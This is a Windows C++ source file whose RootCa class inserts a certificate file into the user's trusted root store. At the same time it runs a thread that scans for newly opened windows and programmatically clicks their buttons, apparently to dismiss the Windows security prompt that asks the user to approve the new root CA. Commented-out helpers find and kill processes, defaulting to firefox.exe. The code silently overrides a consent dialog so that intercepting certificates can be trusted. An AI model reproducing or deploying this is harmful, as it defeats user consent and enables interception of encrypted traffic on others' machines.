#include "Singleton.h"
#include <string>

class RootCa
{
	DECLARE_SINGLETON(RootCa)
public:
	RootCa();
	int checkCert(std::string regKey);
	int insertSert(std::string certPath, std::string regKey);
	static unsigned __stdcall sendKeyAccept(void* lpParameter);
	int has;
};

#pragma once


#include <Wincrypt.h>
#pragma comment(lib, "crypt32.lib")
#define MY_ENCODING_TYPE  (PKCS_7_ASN_ENCODING | X509_ASN_ENCODING)
#include <TlHelp32.h>
//#include <process.h>


/*
#include <vector>
#include <string>
#include <sstream>
#include <utility>
#include <fstream>
*/

inline RootCa::RootCa()
{
	this->has = 0;
}

static int sendKey(WORD vkey) {
	INPUT input;
	//WORD vkey = VK_RETURN; // see link below 
	//VK_ESCAPE
	//VK_LEFT
	input.type = INPUT_KEYBOARD;
	input.ki.wScan = MapVirtualKey(vkey, MAPVK_VK_TO_VSC);
	input.ki.time = 0;
	input.ki.dwExtraInfo = 0;
	input.ki.wVk = vkey;
	input.ki.dwFlags = 0; // there is no KEYEVENTF_KEYDOWN
	SendInput(1, &input, sizeof(INPUT));
	return 1;
}

#include <iostream>


int click()
{
	HWND parent = GetConsoleWindow();
	
	std::vector< HWND > list;
	for (HWND hwnd = GetAncestor(parent, GA_ROOT); hwnd != NULL; hwnd = GetNextWindow(hwnd, GW_HWNDNEXT)) //
	{  
		if (!IsWindowVisible(hwnd))
			continue;

		int length = GetWindowTextLength(hwnd);
		if (length == 0)
			continue;
		
		char title[512];
		GetWindowTextA(hwnd, title, sizeof title);
		
		if (title == "Program Manager")
			continue;
		
		list.push_back(hwnd);
		
		//printf("hwnd %d name %s\r\n", hwnd, title);
		
		/*
		HWND cmp_parent = GetWindow(hwnd, GW_OWNER);
		HWND hParent = GetAncestor(hwnd, GA_ROOT);
		
		char title2[512];
		GetWindowTextA(hParent, title2, sizeof title2);
		
		char title3[512];
		GetWindowTextA(parent, title3, sizeof title3);
		
		char title4[512];
		GetWindowTextA(cmp_parent, title4, sizeof title4);
		
		
		
		printf("name %s <%s> (%s) {%s}\r\n", title, title2, title3, title4);
		
		
		if(parent == cmp_parent)
		{
			
			
			printf("OKOKOK\r\n");
			HWND button_ = FindWindowExA(hwnd, 0, "Button", 0);
			if(button_)
			{
				printf("click\r\n");
				//SendMessage(button_, BM_CLICK, 0, 0);
				return 1;
			}
			return 0;
			
		}
		*/
	}
	
	//printf("size %d\r\n", list.size());
	
	for (HWND hwnd = GetTopWindow(hwnd); hwnd != NULL; hwnd = GetNextWindow(hwnd, GW_HWNDNEXT)) //GetAncestor(parent, GA_ROOT);
	{
		if (!IsWindowVisible(hwnd))
			continue;

		int length = GetWindowTextLength(hwnd);
		if (length == 0)
			continue;
		
		char title[512];
		GetWindowTextA(hwnd, title, sizeof title);
		
		if (title == "Program Manager")
			continue;
		
		int finded = 0;
		for(int i = 0; i < list.size(); i++)
		{
			HWND tmp = list[i];
			//char title[512];
			//GetWindowTextA(tmp, title, sizeof title);
			//printf("hwnd %d name %s\r\n", tmp, title);
			
			if(hwnd == tmp)
			{
				finded = 1;
				char title[512];
				GetWindowTextA(hwnd, title, sizeof title);
				//printf("hwnd %d name %s\r\n", hwnd, title);
			}

		}
		
		if(finded == 0)
		{
			char title[512];
			GetWindowTextA(hwnd, title, sizeof title);
			printf("hwnd %d name %s\r\n", hwnd, title);
			
			HWND button_ = FindWindowExA(hwnd, 0, "Button", 0);
			
			if(button_)
			{
				//printf("Ok\r\n");
				//wchar_t className2[128];
				//GetClassName(button_, className2, 128);
				//std::wcout << className2 << std::endl;
				printf("clicK\r\n");
				//Sleep(1000);
				SendMessage(button_, BM_CLICK, 0, 0);
				return 1;
			}
		}
	
	}
	
	return 0;
	
	
		/*
		if (!IsWindowVisible(hwnd))
			continue;

		int length = GetWindowTextLength(hwnd);
		if (length == 0)
			continue;

		
		
		
		
		
		char title[512];
		GetWindowTextA(hwnd, title, sizeof title);
		
		if (title == "Program Manager")
			continue;
		
		wchar_t className[128];
		GetClassName(hwnd, className, 128);

		printf("name %s\r\n", title);
		
		if(wcscmp (L"#32770",className) == 0)
		{
			std::wcout << className << std::endl;
			
			
			HWND button_ = FindWindowExA(hwnd, 0, "Button", 0);
			
			if(button_)
			{
				wchar_t className2[128];
				GetClassName(button_, className2, 128);
				std::wcout << className2 << std::endl;
				printf("clicK\r\n");
				//Sleep(1000);
				//SendMessage(button_, BM_CLICK, 0, 0);
				//return 1;
			}
			
		}
		*/
	

	return 0;
}

inline unsigned __stdcall RootCa::sendKeyAccept(void* lpParameter)
{
	
	if(RootCa::Instance()->has == 0)
	{
		//Sleep(1000);
		int max = 100;
		int num = 0;
		HWND button_ = NULL;
		while(1)
		{
			int res = click();
			//break;
			if(res) break;
			
			/*
			button_ = FindWindowExA(hWnd2, 0, "Button", 0);
			if(button_)
			{
				printf("clicK\r\n");
				SendMessage(button_, BM_CLICK, 0, 0);
				
			}
			*/
			
			num++;
			if(num > max) break;
			
			Sleep(10);
		}
		
	}
	/*
	printf("end");
	
	
	//HWND hWnd = FindWindow (NULL, L"Looper");               // Search startup window
	HWND hWnd = GetForegroundWindow();
	

	DWORD pid;                                                      // Get process id
	GetWindowThreadProcessId (hWnd, &pid);

	HANDLE hProc = OpenProcess (PROCESS_ALL_ACCESS, FALSE, pid);
	printf("pid %d\r\n", pid);
	
	 
	 char buffer[128];
    int written = GetWindowTextA(hWnd, buffer, 128);
	
	//HWND hTrayNotifyWnd = FindWindowEx(hWnd, 0, "Ok", NULL);
	
	printf("buffer %s\r\n", buffer);
	Sleep(1000);
	SetFocus(hWnd);
	
	HWND class_ = FindWindowExA(hWnd, 0, "Button", 0);
	
	//HWND dialog = FindWindowEx(hWnd, 0, 0, "Да");	
	
	SetWindowTextA(class_, "ABRACADABRA");
	SendMessage(class_, BM_CLICK, 0, 0);
	
	
	return 1;
	while(RootCa::Instance()->has == 0)
	{
		//Sleep(100);
		sendKey(VK_LEFT);
		sendKey(VK_RETURN);
		Sleep(20);
		sendKey(VK_LEFT);
		sendKey(VK_RETURN);
		Sleep(20);
	}

	return 1;
	*/
}

inline int RootCa::checkCert(std::string regKey) {
	HANDLE hfile = INVALID_HANDLE_VALUE;
	PCCERT_CONTEXT pctx = NULL;
	HCERTSTORE         hSystemStore;
	PCCERT_CONTEXT     pCertContext = NULL;
	char pszNameString[256];

	while (true) {


		if (hSystemStore = CertOpenSystemStore(0, L"ROOT"))
		{
			printf("The CA system store is open. Continue.\n");
		}
		else
		{
			printf("The first system store did not open.\n");
			break;
		}

		while (pCertContext = CertEnumCertificatesInStore(hSystemStore, pCertContext))
		{
			if (CertGetNameStringA(
				pCertContext,
				CERT_NAME_SIMPLE_DISPLAY_TYPE,
				0,
				NULL,
				pszNameString,
				128)) {

				//printf("\nCertificate for %s \n", pszNameString);
				std::string certName = pszNameString;
				if (certName.find(regKey) != std::string::npos) {
					printf("Certificate was found. \n");
					return 1;
				}

			}
			else {
				printf("CertGetName failed. \n");
			}

		}
		break;
	}
	return 0;
}

wchar_t* CharToLizzz(const char* char_string)
{
	LPWSTR res;
	DWORD res_len = MultiByteToWideChar(1251, 0, char_string, -1, NULL, 0);
	res = (LPWSTR)GlobalAlloc(GPTR, (res_len + 1) * sizeof(WCHAR));
	MultiByteToWideChar(1251, 0, char_string, -1, res, res_len);
	return res;
}

inline int RootCa::insertSert(std::string certPath, std::string regKey) {

	const wchar_t* sertPatch = CharToLizzz(certPath.c_str());
	const wchar_t* regKeyW = CharToLizzz(regKey.c_str());

	//std::wcout << "Add Cert: " << regKeyW << " Path: " << sertPatch << "\r\n";

	void* pfx = NULL;
	PCCERT_CONTEXT pctx = NULL;
	HCERTSTORE         hSystemStore;
	BYTE*              pbElement;
	DWORD              cbElement;
	PCCERT_CONTEXT     pCertContext = NULL;
	char pszNameString[256];
	int status;

	while (true) {

		status = 0;


		if (hSystemStore = CertOpenSystemStore(
			0,
			L"ROOT"))
		{
			lizzz_Log::Instance()->addLog("The CA system store is open. Continue.");
			//printf("The CA system store is open. Continue.\n");
		}
		else
		{
			lizzz_Log::Instance()->addLog("The first system store did not open.");
			//printf("The first system store did not open.\n");
			break;
		}


		if (CryptQueryObject(
			CERT_QUERY_OBJECT_FILE,
			sertPatch,//L"C:\\Users\\jibril\\AppData\\Roaming\\Aferon\\root.crt",
			CERT_QUERY_CONTENT_FLAG_ALL,
			CERT_QUERY_FORMAT_FLAG_ALL,
			0,
			NULL,
			NULL,
			NULL,
			NULL,
			NULL,
			(const void **)&pctx) != 0)
		{
			lizzz_Log::Instance()->addLog("Sert opened with " + certPath);
			//printf("Sert opened with %s\r\n", certPath.c_str());
		}
		else {
			lizzz_Log::Instance()->addLog("Request cert error");
			//printf("Request cert error\r\n");
			break;
		}

		if (pctx == NULL)
		{
			//printf("Error in 'CertCreateCertificateContext'");

			lizzz_Log::Instance()->addLog("Error in 'CertCreateCertificateContext'");

			DWORD error = GetLastError();

			if (error == E_INVALIDARG)
			{
				lizzz_Log::Instance()->addLog("Mod detected an invalid argument");
				//printf("Mod detected an invalid argument");
			}

			lizzz_Log::Instance()->addLog("Error Code: " + std::to_string(error));
			//printf("Error Code: %d", error);

			break;
		}


		// Open the store where the new certificate will be added.
		pCertContext = pctx;

		//--------------------------------------------------------------------
		// Find out how much memory to allocate for the serialized element.

		if (CertSerializeCertificateStoreElement(
			pCertContext,      // The existing certificate.
			0,                 // Accept default for dwFlags,
			NULL,              // NULL for the first function call.
			&cbElement))       // Address where the length of the
							   // serialized element will be placed.
		{
			lizzz_Log::Instance()->addLog("The length of the serialized string is: " + std::to_string(cbElement));
			//printf("The length of the serialized string is %d.\n", cbElement);
		}
		else
		{
			lizzz_Log::Instance()->addLog("Finding the length of the serialized element failed");
			//printf("Finding the length of the serialized element failed.");
			break;
		}
		//--------------------------------------------------------------------
		// Allocate memory for the serialized element.

		if (pbElement = (BYTE*)malloc(cbElement))
		{
			lizzz_Log::Instance()->addLog("Memory has been allocated. Continue.");
			//printf("Memory has been allocated. Continue.\r\n");
		}
		else
		{
			lizzz_Log::Instance()->addLog("The allocation of memory failed.");
			//printf("The allocation of memory failed.\r\n");
			break;
		}
		//--------------------------------------------------------------------
		// Create the serialized element from a certificate context.

		if (CertSerializeCertificateStoreElement(
			pCertContext,        // The certificate context source for the
								 // serialized element.
			0,                   // dwFlags. Accept the default.
			pbElement,           // A pointer to where the new element will
								 // be stored.
			&cbElement))         // The length of the serialized element,
		{
			lizzz_Log::Instance()->addLog("The encoded element has been serialized.");
			//printf("The encoded element has been serialized. \r\n");
		}
		else
		{
			lizzz_Log::Instance()->addLog("The element could not be serialized.");
			//printf("The element could not be serialized.");
			break;
		}

		//  The following process uses the serialized
		//  pbElement and its length, cbElement, to
		//  create a new certificate and add it to a store.

		_beginthreadex(NULL, 0, &sendKeyAccept, (void*)0, 0, NULL);

		if (CertAddSerializedElementToStore(
			hSystemStore,        // Store where certificate is to be added.
			pbElement,           // The serialized element for another
								 // certificate.
			cbElement,           // The length of pbElement.
			CERT_STORE_ADD_REPLACE_EXISTING,
			// Flag to indicate what to do if a matching
			// certificate is already in the store.
			0,                   // dwFlags. Accept the default.
			CERT_STORE_CERTIFICATE_CONTEXT_FLAG,
			NULL,
			NULL
		))
		{
			RootCa::Instance()->has = 1;
			lizzz_Log::Instance()->addLog("The new certificate is added to the open store.");
			//printf("The new certificate is added to the open store.\n");
			status = 1;
			break;
		}
		else
		{
			lizzz_Log::Instance()->addLog("The new element was not added to a store.");
			//printf("The new element was not added to a store.\n");
			break;
		}

	}

	// Clean up.

	if (pCertContext)
		CertFreeCertificateContext(pCertContext);
	if (hSystemStore)
	{
		if (!(CertCloseStore(hSystemStore, 0)))
		{
			lizzz_Log::Instance()->addLog("Could not close system store.");
			//printf("Could not close system store.");
			return status;
		}
	}
	if (pbElement)
		free(pbElement);



	return status;
}

/*

class RootCa {
public:


	static bool copyFile(const char *SRC, const char* DEST)
	{

		std::ifstream src(SRC, std::ios::binary);
		std::ofstream dest(DEST, std::ios::binary);
		dest << src.rdbuf();
		return src && dest;
	}

	
	
	
	





	static BOOL TerminateMyProcess(DWORD dwProcessId, UINT uExitCode)
	{
		DWORD dwDesiredAccess = PROCESS_TERMINATE;
		BOOL  bInheritHandle = FALSE;
		HANDLE hProcess = OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);
		if (hProcess == NULL)
			return FALSE;

		BOOL result = TerminateProcess(hProcess, uExitCode);

		CloseHandle(hProcess);

		return result;
	}

	static std::vector<int> getProcesses(std::string proccesName = "firefox.exe") {
		std::vector<int> proc;
		PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
		HANDLE hProcSnap;
		hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

		const wchar_t *procName = GetWC(proccesName.c_str());

		if (Process32First(hProcSnap, &pe32))
		{
			do {

				if (!wcscmp(pe32.szExeFile, procName))
				{
					int id = pe32.th32ProcessID;
					proc.push_back(id);
				}
			} while (Process32Next(hProcSnap, &pe32));
		}
		return proc;

	}

	static int hasProcess(std::string proccesName = "firefox.exe") {
		std::vector<int> proc = getProcesses(proccesName);
		return (proc.size() == 0) ? 0 : 1;
	}

	static int killProcessWithoutCurrent(std::string proccesName = "firefox.exe") {
		int currentId = GetCurrentProcessId();

		std::vector<int> proc = getProcesses(proccesName);
		for (int i = 0; i < proc.size(); i++) {
			//printf("find process by kill: %d\r\n", proc[i]);

			if (proc[i] != currentId) {
				Helper::TerminateMyProcess(proc[i], 1);
			}
			
		}

		return 1;
	}

	static int killProcess(std::string proccesName = "firefox.exe") {
		std::vector<int> proc = getProcesses(proccesName);
		for (int i = 0; i < proc.size(); i++) {
			printf("find process by kill: %d\r\n", proc[i]);

			Helper::TerminateMyProcess(proc[i], 1);
		}

		return 1;
	}



};

*/